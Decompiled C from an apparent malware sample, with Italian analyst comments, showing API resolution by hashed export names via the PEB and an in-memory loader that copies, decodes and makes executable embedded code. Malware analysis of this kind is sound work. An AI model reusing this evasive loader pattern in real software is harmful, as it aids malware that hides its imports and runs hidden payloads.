
code *more_api_call(void)

{
	uint8_t uVar1;
	short *psVar2;
	int iVar3;
	int iVar4;
	int iVar5;
	code *page_allocated;
	undefined *pagina_allocata;
	code *pagina_allocata2;
	uint8_t *puVar9;
	undefined *puVar10;
	code *pcVar11;
	int iVar12;
	int function_6a75788;
	code *virtual_free;
	uint uVar15;
	int unaff_FS_OFFSET;
	code *pcVar16;
	code *pcStack_4c;
	undefined4 uStack_48;
	undefined4 uStack_44;
	code *pcStack_40;
	code *pcStack_3c;
	int iStack_38;
	undefined4 uStack_34;
	code *virtual_alloc;

	psVar2 = *(short **)(*(int *)**(undefined4 **)(*(int *)(*(int *)(unaff_FS_OFFSET + 0x30) + 0xc) + 0xc) +
						 0x18);
	if (psVar2 != (short *)0x0)
	{
		if (*psVar2 == 0x5a4d)
		{
			if (*(int *)(*(int *)(psVar2 + 0x1e) + (int)psVar2) == 0x4550)
			{
				function_6a75788 = *(int *)(*(int *)(psVar2 + 0x1e) + 0x78 + (int)psVar2) + (int)psVar2;
				if (function_6a75788 == 0)
				{
					virtual_alloc = (code *)0x0;
				}
				else
				{
					iVar3 = *(int *)(function_6a75788 + 0x1c);
					uVar15 = 0;
					iVar4 = *(int *)(function_6a75788 + 0x20);
					iVar5 = *(int *)(function_6a75788 + 0x24);
					if (*(int *)(function_6a75788 + 0x18) != 0)
					{
						do
						{
							iVar12 = 0;
							puVar9 = (uint8_t *)(*(int *)((int)psVar2 + uVar15 * 4 + iVar4) + (int)psVar2);
							if (puVar9 != (uint8_t *)0x0)
							{
								uVar1 = *puVar9;
								while (uVar1 != '\0')
								{
									iVar12 = iVar12 + 1;
									uVar1 = puVar9[iVar12];
								}
							}
							uStack_34 = 0x4295e2;
							iVar12 = hasher(puVar9, iVar12);
							if (iVar12 == 0x7fdb33b8)
							{
								virtual_alloc = (code *)(*(int *)((int)psVar2 +
																  (uint) * (ushort *)((int)psVar2 + uVar15 * 2 + iVar5) * 4 + iVar3) +
														 (int)psVar2);
								goto LAB_004295f5;
							}
							uVar15 = uVar15 + 1;
						} while (uVar15 < *(uint *)(function_6a75788 + 0x18));
					}
					virtual_alloc = (code *)0x0;
				}
			}
			else
			{
				virtual_alloc = (code *)0x0;
			}
		}
		else
		{
			virtual_alloc = (code *)0x0;
		}
	LAB_004295f5:
		if (((*psVar2 == 0x5a4d) && (*(int *)(*(int *)(psVar2 + 0x1e) + (int)psVar2) == 0x4550)) &&
			(function_6a75788 = *(int *)(*(int *)(psVar2 + 0x1e) + 0x78 + (int)psVar2) + (int)psVar2, function_6a75788 != 0))
		{
			iVar3 = *(int *)(function_6a75788 + 0x1c);
			uVar15 = 0;
			iVar4 = *(int *)(function_6a75788 + 0x20);
			iVar5 = *(int *)(function_6a75788 + 0x24);
			if (*(int *)(function_6a75788 + 0x18) != 0)
			{
				do
				{
					iVar12 = 0;
					puVar9 = (uint8_t *)(*(int *)((int)psVar2 + uVar15 * 4 + iVar4) + (int)psVar2);
					if (puVar9 != (uint8_t *)0x0)
					{
						uVar1 = *puVar9;
						while (uVar1 != '\0')
						{
							iVar12 = iVar12 + 1;
							uVar1 = puVar9[iVar12];
						}
					}
					uStack_34 = 0x429670;
					iVar12 = hasher(puVar9, iVar12);
					if (iVar12 == 0x1d499ba0)
					{
						virtual_free = (code *)(*(int *)((int)psVar2 +
														 (uint) * (ushort *)((int)psVar2 + uVar15 * 2 + iVar5) * 4 +
														 iVar3) +
												(int)psVar2);
						goto LAB_0042967f;
					}
					uVar15 = uVar15 + 1;
				} while (uVar15 < *(uint *)(function_6a75788 + 0x18));
			}
		}
		virtual_free = (code *)0x0;
	LAB_0042967f:
		if (((*psVar2 == 0x5a4d) && (*(int *)(*(int *)(psVar2 + 0x1e) + (int)psVar2) == 0x4550)) &&
			(function_6a75788 = *(int *)(*(int *)(psVar2 + 0x1e) + 0x78 + (int)psVar2) + (int)psVar2, function_6a75788 != 0))
		{
			iVar3 = *(int *)(function_6a75788 + 0x1c);
			uVar15 = 0;
			iVar4 = *(int *)(function_6a75788 + 0x20);
			iVar5 = *(int *)(function_6a75788 + 0x24);
			if (*(int *)(function_6a75788 + 0x18) != 0)
			{
				do
				{
					iVar12 = 0;
					puVar9 = (uint8_t *)(*(int *)((int)psVar2 + uVar15 * 4 + iVar4) + (int)psVar2);
					if (puVar9 != (uint8_t *)0x0)
					{
						uVar1 = *puVar9;
						while (uVar1 != '\0')
						{
							iVar12 = iVar12 + 1;
							uVar1 = puVar9[iVar12];
						}
					}
					uStack_34 = 0x429707;
					iVar12 = hasher(puVar9, iVar12);
					if (iVar12 == 0x6a75788)
					{
						function_6a75788 = *(int *)((int)psVar2 +
													(uint) * (ushort *)((int)psVar2 + uVar15 * 2 + iVar5) * 4 + iVar3) +
										   (int)psVar2;
						goto LAB_0042971e;
					}
					uVar15 = uVar15 + 1;
				} while (uVar15 < *(uint *)(function_6a75788 + 0x18));
			}
		}
		function_6a75788 = 0;
	LAB_0042971e:



		//da qui inizia a caricare il codice in memoria

			/*		
			uStack_34 = 4;
		iStack_38 = 0x3000;
		pcStack_3c = (code *)0xce0;
		pcStack_40 = (code *)0x0;
		uStack_44 = 0x42974e;
		page_allocated = (code *)(*virtual_alloc)();

		uVar15 = 0;
		do
		{
			page_allocated[uVar15] = (code)0x0;
			uVar15 = uVar15 + 1;
		} while (uVar15 < 0xce0);
		 */ 
		//questo sopra è codice che non viene utilizzato nel report c'era scritto alocasse tanta memoria ma poi non la usasse mai


		uStack_44 = 4;
		uStack_48 = 0x3000;
		pcStack_4c = (code *)0x80;

		//non la usa???

		pagina_allocata = (undefined *)(*virtual_alloc)(0); // qui ghidra pure ha decompilato male perché si vede che mette nella stack
		// i valori dei parametri prima di chiamare la funzione, ma poi non li mette nella chiamata
		if (pagina_allocata != (undefined *)0x0)
		{
			uVar15 = 0;
			do
			{
				pagina_allocata[uVar15] = 0;
				uVar15 = uVar15 + 1;
			} while (uVar15 < 0x80); // mette a zero i 0x80 byte


			if ((pagina_allocata < &DAT_004366e8) || (0x436767 < pagina_allocata))
			{
				uVar15 = 0;
				do
				{
					pagina_allocata[uVar15] = (pagina_allocata + uVar15)[(int)&DAT_004366e8 - (int)pagina_allocata];
					uVar15 = uVar15 + 1;
				} while (uVar15 < 0x80);
			}
			else
			{
				function_6a75788 = 0x80;
				puVar10 = pagina_allocata + 0x7f;
				do
				{
					*puVar10 = puVar10[(int)&DAT_004366e8 - (int)pagina_allocata];
					function_6a75788 = function_6a75788 + -1;
					puVar10 = puVar10 + -1;
					virtual_free = pcStack_3c;
				} while (function_6a75788 != 0);
			}// prima carica gli 80 byte di codice


			pcVar16 = (code *)0x0;
			pagina_allocata2 = (code *)(*pcStack_40)(0, 0xce0, 0x3000, 4);
			


			if (pagina_allocata2 != (code *)0x0)
			{
				if ((pagina_allocata2 < &DAT_004367e8) || ((code *)0x4374c7 < pagina_allocata2)) // se il codice non supera il suo stesso indirizzo copia in avanti
				{															 // credo che questo dia codice riutilizzato perchè la virtualAlloc crea una pagina vuota
					uVar15 = 0;												//utilizza la stess logica anche prima
					do
					{
						pcStack_40 = (code *)uVar15;
						pagina_allocata2[(int)pcStack_40] =
							(pagina_allocata2 + (int)pcStack_40)[(int)&DAT_004367e8 - (int)pagina_allocata2];
						uVar15 = (int)pcStack_40 + 1U;
					} while ((int)pcStack_40 + 1U < 0xce0);
				} // qua pure sta facendo quella cosa
				else // se no copia all'indietro
				{
					function_6a75788 = 0xce0;
					virtual_free = pagina_allocata2 + 0xcdf;
					uVar15 = 0xcdf;
					do
					{
						pcStack_40 = (code *)uVar15;
						*virtual_free = virtual_free[(int)&DAT_004367e8 - (int)pagina_allocata2];
						function_6a75788 = function_6a75788 + -1;
						virtual_free = virtual_free + -1;
						uVar15 = (int)pcStack_40 - 1;
						page_allocated = pcStack_3c;
					} while (function_6a75788 != 0);
				}

				FUN_00428590(pagina_allocata, 0x80); // ora dovrebbe utilizzare quel codice (utilizzata anche in other_api_call2)

				virtual_free = pcStack_4c;
				if ((page_allocated < pagina_allocata2) || (pagina_allocata2 + 0xce0 <= page_allocated))
				{
					uVar15 = 0;
					do
					{
						pcStack_40 = (code *)uVar15;
						page_allocated[(int)pcStack_40] = (page_allocated + (int)pcStack_40)[(int)pagina_allocata2 - (int)page_allocated];
						uVar15 = (int)pcStack_40 + 1U;
					} while ((int)pcStack_40 + 1U < 0xce0);
				}
				else
				{
					iStack_38 = (int)pagina_allocata2 - (int)page_allocated;
					function_6a75788 = 0xce0;
					pcVar11 = page_allocated + 0xcdf;
					uVar15 = 0xcdf;
					do
					{
						pcStack_40 = (code *)uVar15;
						*pcVar11 = pcVar11[iStack_38];
						function_6a75788 = function_6a75788 + -1;
						pcVar11 = pcVar11 + -1;
						uVar15 = (int)pcStack_40 - 1;
						page_allocated = pcStack_3c;
					} while (function_6a75788 != 0);
				}
				(*pcStack_4c)(pagina_allocata, 0, 0x8000);
				(*virtual_free)(pagina_allocata2, 0, 0x8000);
				(*pcVar16)(page_allocated, 0xce0, 0x20, &pcStack_4c);
				return page_allocated;
			}
			(*virtual_free)(pagina_allocata, 0, 0x8000);
		}
		(*virtual_free)(page_allocated, 0, 0x8000);
	}
	return (code *)0x0;
}
